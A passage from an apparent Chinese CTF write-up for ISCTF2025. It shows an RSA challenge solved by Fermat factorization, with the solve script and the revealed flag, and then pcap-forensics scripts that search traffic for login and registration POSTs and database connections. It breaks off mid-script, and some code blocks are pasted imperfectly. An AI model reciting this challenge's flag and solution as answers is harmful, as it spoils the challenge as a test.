<p>逐字符换回标准 Base64 后得到的标准串为：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dVEUmUQlJQSQCIZQcRVnWXSRETg5IXQ5hAMIRIFQVVQhFhkRCDlVEJF4J3hlaJISYkREQWAQBYMIgocJFwB5KHM0KSEEQEZxIDWSORc=</span><br></pre></td></tr></table></figure>

<p>base64解码出来并不是数字字符串，但是原始字节（十六进制）为：</p>
<p>75 51 14 99 44 25 25 04 90 08 86 50 71 15 67 59</p>
<p>74 91 11 38 39 21 74 39 84 03 08 44 81 50 55 54</p>
<p>21 16 19 11 08 39 55 10 91 78 27 78 65 68 92 12</p>
<p>62 44 44 41 60 10 05 83 08 82 87 09 17 00 79 28</p>
<p>73 34 29 21 04 40 46 71 20 35 92 39 17</p>
<p>十六进制没有字母？将这串数字作为c</p>
<p>接下来解密码题</p>
<ol>
<li><p>分析题目:<br>题目提示“这是一道费马”，且给出了 RSA 的公钥参数 n,e 和密文 c。这通常暗示 n 的两个素因子 p 和 q 非常接近，可以使用费马分解法 (Fermat’s Factorization Method) 快速分解 nn。</p>
</li>
<li><p>解密步骤：<br>使用费马分解法分解 n 得到 p 和 q。<br>计算欧拉函数 ϕ(n)&#x3D;(p−1)(q−1)ϕ(n)&#x3D;(p−1)(q−1)。<br>计算私钥dd，满足 d⋅e≡1(modϕ(n))d⋅e≡1(modϕ(n))。<br>解密密文 m&#x3D;cd(modn)m&#x3D;cd(modn)。<br>将 mm 转换为字节串得到 flag。</p>
</li>
</ol>
<p>解密脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, inverse</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">n = <span class="number">7644027341241571414254539033581025821232019860861753472899980529695625198016019462879314488666454640621660011189097660092595699889727595925351737140047609</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">7551149944252504900886507115675974911138392174398403084481505554211619110839551091782778656892126244444160100583088287091700792873342921044046712035923917</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fermat_factorization</span>(<span class="params">n</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Fermat&#x27;s factorization method</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># n = a^2 - b^2 = (a-b)(a+b)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Start checking a from sqrt(n)</span></span><br><span class="line"></span><br><span class="line">    a = math.isqrt(n)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> a * a &lt; n:</span><br><span class="line"></span><br><span class="line">        a += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">        b2 = a * a - n</span><br><span class="line"></span><br><span class="line">        b = math.isqrt(b2)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> b * b == b2:</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> a - b, a + b</span><br><span class="line"></span><br><span class="line">        a += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> count % <span class="number">1000000</span> == <span class="number">0</span>:</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Searching... iteration <span class="subst">&#123;count&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Starting factorization...&quot;</span>)</span><br><span class="line"></span><br><span class="line">p, q = fermat_factorization(n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Found p: <span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Found q: <span class="subst">&#123;q&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">d = inverse(e, phi)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"></span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Flag: <span class="subst">&#123;flag.decode()&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>Flag: ISCTF{M15c_10v3_Cryp70}</p>
<h2 id="应急响应–hacker"><a href="#应急响应–hacker" class="headerlink" title="应急响应–hacker"></a>应急响应–hacker</h2><p>流量分析题，用wireshark打开查看，发现<code>POST /login.php</code>的字，使用多脚本（<code>analyze_registrations.py</code>, <code>find_post_any_port.py</code>, <code>analyze_db_connections.py</code>, <code>search_db_payloads.py</code> 等）解析 pcap，筛选含 <code>register/signup</code>、<code>username=</code>、<code>password=</code> 或 <code>/auth/users</code> 的 HTTP POST 请求，统计源 IP，并检查数据库端口（如 MySQL 3306）交互以寻找写入&#x2F;认证证据。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.utils <span class="keyword">import</span> PcapNgReader</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> scapy.layers.inet <span class="keyword">import</span> IP, TCP</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">PCAP_PATH = <span class="string">r&quot;c:\Users\35518\OneDrive\Desktop\ISCTF2025_hacker\hacker的流量.pcapng&quot;</span></span><br><span class="line"></span><br><span class="line">REG_PATTERNS = [</span><br><span class="line"></span><br><span class="line">    re.<span class="built_in">compile</span>(<span class="string">r&#x27;register&#x27;</span>, re.I),</span><br><span class="line"></span><br><span class="line">    re.<span class="built_in">compile</span>(<span class="string">r&#x27;signup&#x27;</span>, re.I),</span><br><span class="line"></span><br><span class="line">    re.<span class="built_in">compile</span>(<span class="string">r&#x27;/auth/users&#x27;</span>, re.I),</span><br><span class="line"></span><br><span class="line">    re.<span class="built_in">compile</span>(<span class="string">r&#x27;nacos/v1/auth/users&#x27;</span>, re.I),</span><br><span class="line"></span><br><span class="line">    re.<span class="built_in">compile</span>(<span class="string">r&#x27;username=&#x27;</span>, re.I),</span><br><span class="line"></span><br><span class="line">    re.<span class="built_in">compile</span>(<span class="string">r&#x27;password=&#x27;</span>, re.I),</span><br><span class="line"></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">matches_registration</span>(<span class="params">uri_or_body</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> uri_or_body:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> REG_PATTERNS:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> p.search(uri_or_body):</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_request_line_and_body</span>(<span class="params">s</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment"># split into request line and rest</span></span><br><span class="line"></span><br><span class="line">    parts = s.split(<span class="string">&#x27;\r\n\r\n&#x27;</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    head = parts[<span class="number">0</span>] <span class="keyword">if</span> parts <span class="keyword">else</span> s</span><br><span class="line"></span><br><span class="line">    req_line = head.split(<span class="string">&#x27;\r\n&#x27;</span>,<span class="number">1</span>)[<span class="number">0</span>] <span class="keyword">if</span> head <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    body = parts[<span class="number">1</span>] <span class="keyword">if</span> <span class="built_in">len</span>(parts) &gt; <span class="number">1</span> <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> req_line, body</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"></span><br><span class="line">    counts = defaultdict(<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line">    samples = defaultdict(<span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">        reader = PcapNgReader(PCAP_PATH)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;无法打开 pcap 文件: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> pkt <span class="keyword">in</span> reader:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> IP <span class="keyword">in</span> pkt <span class="keyword">and</span> TCP <span class="keyword">in</span> pkt <span class="keyword">and</span> pkt[TCP].payload:</span><br><span class="line"></span><br><span class="line">                raw = <span class="built_in">bytes</span>(pkt[TCP].payload)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">                    s = raw.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">except</span> Exception:</span><br><span class="line"></span><br><span class="line">                    s = raw.decode(<span class="string">&#x27;latin1&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># look for HTTP request lines</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> s.startswith(<span class="string">&#x27;POST &#x27;</span>) <span class="keyword">or</span> s.startswith(<span class="string">&#x27;GET &#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;\r\nPOST &#x27;</span> <span class="keyword">in</span> s:</span><br><span class="line"></span><br><span class="line">                    <span class="comment"># extract request line and body</span></span><br><span class="line"></span><br><span class="line">                    req_line, body = extract_request_line_and_body(s)</span><br><span class="line"></span><br><span class="line">                    combined = req_line + <span class="string">&#x27;\n&#x27;</span> + body</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> matches_registration(req_line) <span class="keyword">or</span> matches_registration(body):</span><br><span class="line"></span><br><span class="line">                        src = pkt[IP].src</span><br><span class="line"></span><br><span class="line">                        counts[src] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                        ts = <span class="built_in">getattr</span>(pkt, <span class="string">&#x27;time&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">                        tstr = datetime.datetime.fromtimestamp(ts).isoformat() <span class="keyword">if</span> ts <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> <span class="built_in">len</span>(samples[src]) &lt; <span class="number">10</span>:</span><br><span class="line"></span><br><span class="line">                            samples[src].append(&#123;<span class="string">&#x27;time&#x27;</span>: tstr, <span class="string">&#x27;req&#x27;</span>: req_line, <span class="string">&#x27;body&#x27;</span>: body[:<span class="number">1000</span>]&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line"></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># write results to file</span></span><br><span class="line"></span><br><span class="line">    out_path = <span class="string">&#x27;registration_results.txt&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(out_path, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> counts:</span><br><span class="line"></span><br><span class="line">            f.write(<span class="string">&#x27;未检测到注册相关的 HTTP POST 请求。\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;未检测到注册相关的 HTTP POST 请求。&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        f.write(<span class="string">&#x27;来源 IP 及注册相关请求计数（降序）:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> ip, cnt <span class="keyword">in</span> <span class="built_in">sorted</span>(counts.items(), key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>], reverse=<span class="literal">True</span>):</span><br><span class="line"></span><br><span class="line">            f.write(<span class="string">f&#x27;<span class="subst">&#123;ip&#125;</span>\t<span class="subst">&#123;cnt&#125;</span>\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> ex <span class="keyword">in</span> samples.get(ip, []):</span><br><span class="line"></span><br><span class="line">                f.write(<span class="string">&#x27;--- 示例 ---\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                f.write(<span class="string">f&quot;time: <span class="subst">&#123;ex[<span class="string">&#x27;time&#x27;</span>]&#125;</span>\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">                f.write(<span class="string">f&quot;req: <span class="subst">&#123;ex[<span class="string">&#x27;req&#x27;</span>]&#125;</span>\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> ex[<span class="string">&#x27;body&#x27;</span>]:</span><br><span class="line"></span><br><span class="line">                    f.write(<span class="string">&#x27;body: &#x27;</span> + ex[<span class="string">&#x27;body&#x27;</span>].replace(<span class="string">&#x27;\r\n&#x27;</span>,<span class="string">&#x27;\\r\\n&#x27;</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                f.write(<span class="string">&#x27;-----------\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;结果已写入 <span class="subst">&#123;out_path&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line">rom scapy.utils <span class="keyword">import</span> PcapNgReader</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> scapy.layers.inet <span class="keyword">import</span> IP, TCP</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"></span><br><span class="line">PCAP_PATH = <span class="string">r&quot;c:\Users\35518\OneDrive\Desktop\ISCTF2025_hacker\hacker的流量.pcapng&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"></span><br><span class="line">    hits = defaultdict(<span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">        reader = PcapNgReader(PCAP_PATH)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;无法打开 pcapng 文件: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> pkt <span class="keyword">in</span> reader:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> IP <span class="keyword">in</span> pkt <span class="keyword">and</span> TCP <span class="keyword">in</span> pkt <span class="keyword">and</span> pkt[TCP].payload:</span><br><span class="line"></span><br><span class="line">                src = pkt[IP].src</span><br><span class="line"></span><br><span class="line">                raw = <span class="built_in">bytes</span>(pkt[TCP].payload)</span><br><span class="line"></span><br><span class="line">                low = raw.lower()</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> <span class="string">b&#x27;post &#x27;</span> <span class="keyword">in</span> low:</span><br><span class="line"></span><br><span class="line">                    <span class="comment"># try to extract ascii around POST</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">                        s = raw.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">except</span> Exception:</span><br><span class="line"></span><br><span class="line">                        s = raw.decode(<span class="string">&#x27;latin1&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                    <span class="comment"># find line containing POST</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">for</span> line <span class="keyword">in</span> s.splitlines():</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> line.lower().startswith(<span class="string">&#x27;post &#x27;</span>):</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> <span class="built_in">len</span>(hits[src]) &lt; <span class="number">10</span>:</span><br><span class="line"></span><br><span class="line">                                hits[src].append(line.strip())</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line"></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> hits:</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;未检测到任意端口上的 HTTP POST 明文请求。&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ip, lines <span class="keyword">in</span> <span class="built_in">sorted</span>(hits.items(), key=<span class="keyword">lambda</span> x: <span class="built_in">len</span>(x[<span class="number">1</span>]), reverse=<span class="literal">True</span>):</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;ip&#125;</span>\tposts=<span class="subst">&#123;<span class="built_in">len</span>(lines)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> lines:</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  <span class="subst">&#123;l&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"></span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> scapy.utils <span class="keyword">import</span> PcapNgReader</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> scapy.layers.inet <span class="keyword">import</span> IP, TCP</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"></span><br><span class="line">PCAP_PATH = <span class="string">r&quot;c:\Users\35518\OneDrive\Desktop\ISCTF2025_hacker\hacker的流量.pcapng&quot;</span></span><br><span class="line"></span><br><span class="line">DB_PORTS = &#123;<span class="number">3306</span>, <span class="number">5432</span>, <span class="number">27017</span>, <span class="number">1433</span>, <span class="number">1521</span>, <span class="number">5984</span>, <span class="number">6379</span>&#125;</span><br><span class="line"></span><br><span class="line">‘analyze_db_connections.py’</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"></span><br><span class="line">    syn_counts = defaultdict(<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line">    pkt_counts = defaultdict(<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">        reader = PcapNgReader(PCAP_PATH)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;无法打开 pcapng 文件: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> pkt <span class="keyword">in</span> reader:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> IP <span class="keyword">in</span> pkt <span class="keyword">and</span> TCP <span class="keyword">in</span> pkt:</span><br><span class="line"></span><br><span class="line">                src = pkt[IP].src</span><br><span class="line"></span><br><span class="line">                sport = <span class="built_in">int</span>(pkt[TCP].sport)</span><br><span 